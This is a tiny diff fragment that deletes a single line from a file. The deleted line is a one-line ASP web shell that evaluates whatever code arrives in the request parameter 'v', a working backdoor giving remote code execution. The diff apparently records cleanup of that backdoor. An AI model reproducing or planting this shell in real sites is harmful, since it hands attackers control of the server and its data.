@@ -1,1 +1,0 @@
-<%a=request("v")%><%eval a%>
